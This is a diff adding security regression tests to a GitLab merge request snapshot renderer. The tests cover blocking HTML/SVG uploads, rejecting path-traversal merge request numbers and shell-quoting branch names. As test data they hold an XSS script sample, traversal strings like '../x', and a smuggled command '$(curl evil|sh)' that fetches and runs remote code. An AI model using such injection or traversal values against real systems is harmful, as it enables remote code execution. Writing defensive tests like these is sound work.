@@ -95,6 +95,36 @@ def test_unsafe_upload_names_are_never_resolved(tmp_path):
     assert snapshot.upload_refs(m) == [(UPLOAD_ID, "ok.png")]
 
 
+def test_uploads_that_could_run_code_are_not_downloaded():
+    m = snapshot.MergeRequest(data={"iid": 1, "description": f"[a](/uploads/{UPLOAD_ID}/page.html) "
+                                    f"![b](/uploads/{UPLOAD_ID}/logo.SVG) [c](/uploads/{UPLOAD_ID}/r.pdf)"},
+                              discussions=[])
+    assert snapshot.upload_refs(m) == [(UPLOAD_ID, "r.pdf")]
+
+
+def test_uploads_that_could_run_code_link_to_gitlab_even_when_on_disk(snap):
+    (snap / "uploads" / UPLOAD_ID / "page.html").write_text("<script>alert(1)</script>")
+    data = json.loads((snap / "mr" / "1.json").read_text())
+    data["description"] = f"[page](/uploads/{UPLOAD_ID}/page.html)"
+    (snap / "mr" / "1.json").write_text(json.dumps(data))
+    render(snapshot.load(snap))
+    html = (snap / "mr" / "1.html").read_text()
+    assert f'href="https://git.example.org/team/app/uploads/{UPLOAD_ID}/page.html"' in html
+    assert "../uploads/" not in html
+
+
+def test_mr_numbers_must_be_positive_whole_numbers():
+    assert snapshot.mr_number(7) == 7 and snapshot.mr_number("12") == 12
+    for bad in ("../x", "1/../2", -1, 0, True, None, 1.5):
+        with pytest.raises(ValueError):
+            snapshot.mr_number(bad)
+
+
+def test_listing_with_a_bad_mr_number_skips_it(tmp_path):
+    (tmp_path / "mrs.ndjson").write_text(json.dumps(mr(5)) + "\n" + json.dumps({**mr(6), "iid": "../6"}) + "\n")
+    assert [m.iid for m in snapshot.load(tmp_path).mrs] == [5]
+
+
 def test_branch_names_in_git_commands_are_shell_quoted(tmp_path):
     m = mr(9, target_branch="$(curl evil|sh)")
     render(legacy(tmp_path, [m], [m]))
